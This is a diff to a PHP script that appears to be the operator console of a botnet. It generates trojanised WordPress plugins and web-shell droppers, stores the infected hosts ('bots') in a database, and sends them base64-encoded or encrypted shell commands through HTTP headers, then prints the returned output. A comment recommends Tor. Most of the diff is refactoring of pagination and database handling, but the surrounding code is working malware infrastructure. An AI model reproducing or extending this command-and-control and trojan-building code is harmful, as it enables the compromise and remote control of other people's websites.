@@ -2,30 +2,31 @@
 require_once "lib/classes.inc.php";
 
 //crypto
-use curlStuff\defaultClient\genericClientExecuteCommands;
-use curlStuff\mainCurl;
-use curlStuff\validateMeMore\talkToMeDamnit;
-use logos\art\artisticStuff;
-use logos\menus\mainMenu;
-use new_bots\makeMeSlim\slimDropper;
-use new_bots\wordpressPlugins\makeMeWordPressing;
-use userAgents\agentsList;
-
+use crypto\decryptShellResponses\decryptor;
 //end crypto
 
 //pipe dream.
 //end pipe dream.
 
 // communications
+use bots\bot_files\hereEatThis;
+use curlStuff\defaultClient\genericClientExecuteCommands;
+use curlStuff\mainCurl;
+use curlStuff\validateMeMore\talkToMeDamnit;
+use userAgents\agentsList;
 //end communications
 
 // might remove this, since tor is what should be used.
 // end stuff.
 
 // droppers
+use new_bots\makeMeSlim\slimDropper;
+use new_bots\wordpressPlugins\makeMeWordPressing;
 // end droppers
 
 //graphics and shit
+use logos\art\artisticStuff;
+use logos\menus\mainMenu;
 //end graphipcs and shit.
 
 $d = default_config;
@@ -39,18 +40,57 @@ $choices = [
     "postgres" => $configs['pg_presets'],
     "sqlite" => $configs['sqlite_presets']
 ];
-
 if (str_contains(SQL_USE, "PGSQL")) {
-    $database = new database\slopPgSql($choices['postgres']['pg_host'], $choices['postgres']['pg_user'], $choices['postgres']['pg_pass']);
-    $database->firstRun();
+    define("database", new database\slopPgSql($choices['postgres']['pg_host'], $choices['postgres']['pg_user'], $choices['postgres']['pg_pass']));
 } else {
-
-    $database = new database\slopSqlite($choices['sqlite']['sqlite_db']);
-    var_dump($database->firstRun());
-    readline("Press enter to continue.");
+    define("database", new database\slopSqlite($choices['sqlite']['sqlite_db']));
 }
+var_dump(database->firstRun());
+readline("Press enter to continue.");
+function pagination()
+{
+    $page = 0;
+    $itemsPerPage = 10;
+    $lastId = 0;
+    do {
+        $lastId = database->grabAndFormatOutput($lastId, $itemsPerPage, "bot");
+        $lastPage = ($lastId < $itemsPerPage);
+        echo "Current Page: " . ($page + 1) . "\n";
+        echo "Press 'n' for next, 'b' for back, or 'q' to quit and return to the main menu: ";
+        $handle = fopen("php://stdin", "r");
+        $action = trim(fgets($handle));
+        fclose($handle);
+        if (is_numeric($action)) {
+            return $action;
+        }
+        if ($action ==='n') {
+            if (!$lastPage) {
+                $page++;
+                $lastId = database->grabAndFormatOutput($lastId, $itemsPerPage, "bot");
+                $lastPage = ($lastId < $itemsPerPage);
+                if ($lastPage) {
+                    echo "You're on the last page.\n";
+                }
+            } else {
+                echo "You're already on the last page.\n";
+            }
+        } elseif ($action === 'b') {
+            if ($page > 0) {
+                $page--;
+                $lastId -= $itemsPerPage;
+                $lastId = database->grabAndFormatOutput($lastId, $itemsPerPage, "bot");
+            } else {
+                echo "You're on the first page. Cannot go back any further.\n";
+            }
+        }elseif ($action === "q"){
+            return 0;
+        }
+    } while ($action !== "q");
+}
+
 $l->prepareFrames();
 $l->displayLogo();
+$current = null;
 while (true) {
     system(CLEAR);
     $l->displayStaticAsciiLogo();
@@ -59,55 +99,15 @@ while (true) {
     switch ($c) {
         case str_starts_with($c, "sys") !== false:
             $m->enumSystemMenu();
-            $a = new genericClientExecuteCommands();
+            $a = new hereEatThis();
             break;
         case str_starts_with($c, "rev") !== false:
             $m->reverseConnectionsMenu();
             break;
         case str_starts_with($c, "com") !== false:
             // need to add handling into this script for the new script filenames.
-            $m->commandMenu();
-            $page = 0;
-            $itemsPerPage = 10;
-            $lastId = 0;
-            $previous = 0;
-            do {
-                $lastId = $database->grabAndFormatOutput($lastId, $itemsPerPage);
-                $lastPage = ($lastId < $itemsPerPage);
-                echo "Current Page: " . ($page + 1) . "\n";
-                echo "Press 'n' for next, 'b' for back, or 'q' to quit: ";
-                $handle = fopen("php://stdin", "r");
-                $action = trim(fgets($handle));
-                fclose($handle);
-                if (is_numeric($action)) {
-                    $selectedEntry = $action;
-                    break;
-                }
-                if ($action ==='n') { // next page
-                    if (!$lastPage) {
-                        $page++;
-                        $lastId = $database->grabAndFormatOutput($lastId, $itemsPerPage);
-                        $lastPage = ($lastId < $itemsPerPage);
-                        if ($lastPage) {
-                            echo "You're on the last page.\n";
-                        }
-                    } else {
-                        echo "You're already on the last page.\n";
-                    }
-                } elseif ($action === 'b') {
-                    if ($page > 0) {
-                        $page--;
-                        $lastId -= $itemsPerPage;
-                        $lastId = $database->grabAndFormatOutput($lastId, $itemsPerPage);
-                    } else {
-                        echo "You're on the first page. Cannot go back any further.\n";
-                    }
-                }
-            } while ($action !== "q");
-            if ($action === "q"){
-                break;
-            }
-            $bot = $database->slopSqlite(['action' => "grabBot", "botID" => $selectedEntry]);
+           $selectedEntry = pagination();
+            $bot = database->slopSqlite(['action' => "grabBot", "botID" => $selectedEntry]);
             $coms = new genericClientExecuteCommands([
                 "base_uri" => sprintf("%s://%s", $bot[0]['proto'], $bot[0]['rhost']),
                 "timeout" => 5,
@@ -124,16 +124,7 @@ while (true) {
             ]
             );
             try {
-                echo <<<TYPES
-this shell supports the ability to serialize the commands (if you have multiple to execute at once on the specified host.
-encrypt the command you are trying to execute. This will also need to be decrypted in the client. This feature has not been introduced just yet, but will soon. (older versions have this ability, but that client script sucked.)
-And finally, to just send the raw command over.
-
-The options are:
- 1b -> for no modification of the command other than base64 encoding it.
- 1 -> serialize and base64 encode the command, this works well if you have spaces in your command.
- e -> this will encrypt the command, in addition to base64 encoding it.
-TYPES;
+                $m->commandTypes();
                 $type = readline("Which of the 3 options would you like to select: ");
                 $command = $coms->head($bot[0]['uri'],
                     [
@@ -147,7 +138,6 @@ TYPES;
                         "uuid" => $bot[0]['uuid'],
                         "cname" => $bot[0]['cname'],
                         "cval" => $bot[0]['cvalue'],
-                        ""
                     ]
                 );
             }catch (Exception $e){
@@ -156,7 +146,8 @@ TYPES;
                 break;
             }
             if (!is_null($command->getHeaderLine('D'))){
-                echo sprintf("Command completed!\n\n\033[0;35m%s\033[0m\n\n", base64_decode($command->getHeaderLine("D")));
+                echo sprintf("Command completed!\n\n\033[0;35m%s\033[0m\n\n", base64_decode($command->getHeaderLine("D"))).PHP_EOL;
+                database->slopSqlite(["action" => "updateBot", "botID" => $selectedEntry, "newUri" => $command->getHeaderLine('NewName')]);
             }else{
                 echo "Command failed successfully.....".PHP_EOL;
             }
@@ -176,7 +167,7 @@ TYPES;
                     }
                     $trj = new makeMeWordPressing($act_word, $agents->getRandomAgent(), bin2hex(openssl_random_pseudo_bytes(10)), bin2hex(openssl_random_pseudo_bytes(50)));
                     $a = $trj->createSmallTrojanWordpress();
-                    $database->insertData([
+                    database->insertData([
                             "action" => "add_press",
                             "zip" => $a['TrojanPlugin'],
                             "activator" => $a['ActivationWord'],
@@ -191,7 +182,7 @@ TYPES;
                     }
                     $trj = new makeMeWordPressing($act_word, $agents->getRandomAgent(), bin2hex(openssl_random_pseudo_bytes(10)), bin2hex(openssl_random_pseudo_bytes(50)));
                     $yay = $trj->createChonker();
-                    $database->insertData([
+                    database->insertData([
                         "action" => "add_press",
                         "zip" => $yay['TrojanPlugin'],
                         "activator" => $yay['ActivationWord'],
@@ -204,7 +195,7 @@ TYPES;
                 default:
                     $trj = new slimDropper($agents->getRandomAgent(), $configs['alpha_chars']);
                     $a = $trj->generateDropper();
-                    $database->insertData([
+                    database->insertData([
                         "action" => "add_dropper",
                         "location_on_disk" => $a['dropper'],
                         "post_var" => $a['post_variable'],
@@ -219,7 +210,7 @@ TYPES;
             $m->validateHost();
             $validateMeMore = new talkToMeDamnit();
             try {
-                $validateMeMore->checkMultiHost($database->grabOrFormatOutput(['type' => 'all_bots'])["bots"]);
+                $validateMeMore->checkMultiHost(database->grabOrFormatOutput(['type' => 'all_bots'])["bots"]);
             } catch (Exception $e) {
                 echo $e . PHP_EOL;
             }
@@ -228,9 +219,11 @@ TYPES;
             $m->addToolMenu();
             break;
         case str_starts_with($c, "lt") !== false:
+            //@todo need to add pagination here.
             $m->grabToolsMenu();
             break;
         case str_starts_with($c, "gp") !== false:
+            //@todo need to add pagination here.
             $m->grabProxyMenu();
             break;
         case str_starts_with($c, "r") !== false:
